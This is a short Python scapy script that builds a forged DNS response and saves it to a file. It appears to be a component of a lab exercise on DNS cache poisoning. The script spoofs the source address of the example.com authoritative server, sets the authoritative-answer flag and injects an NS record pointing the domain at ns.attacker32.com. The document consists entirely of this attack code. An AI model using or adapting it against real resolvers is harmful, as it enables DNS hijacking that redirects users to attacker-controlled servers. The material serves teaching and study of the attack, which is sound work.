from scapy.all import *
from scapy.layers.dns import DNSQR
from scapy.layers.dns import DNSRR
from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

if __name__ == "__main__":
# Construct the DNS header and payload
    name = 'twysw.example.com'
    Qdsec = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.5', ttl=259200)
    NSsec  = DNSRR(rrname='example.com', type='NS', rdata='ns.attacker32.com', ttl=259200)
    dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
    qdcount=1, ancount=1, nscount=1, arcount=0,
    qd=Qdsec, an=Anssec, ns=NSsec)
    # Construct the IP, UDP headers, and the entire packet
    ip = IP(dst='10.9.0.53', src='199.43.133.53', chksum=0)
    udp = UDP(dport=33333, sport=53, chksum=0)
    pkt = ip/udp/dns
    # Save the packet to a file
    with open('ip_resp.bin', 'wb') as f:
        f.write(bytes(pkt))
